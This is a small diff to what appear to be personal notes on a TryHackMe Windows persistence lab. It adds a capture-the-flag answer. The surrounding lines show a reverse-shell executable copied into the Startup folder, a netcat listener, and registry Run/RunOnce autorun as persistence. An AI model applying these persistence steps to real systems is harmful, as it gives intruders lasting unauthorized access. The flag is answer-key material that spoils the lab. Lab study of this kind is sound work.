@@ -197,6 +197,7 @@ C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Sta
 nc -lvp 4450
 -log back in 
 -grab flag
+*THM{NO_NO_AFTER_YOU}
 
 Run / RunOnce
 -force a nuser to execute a program on logon via registry
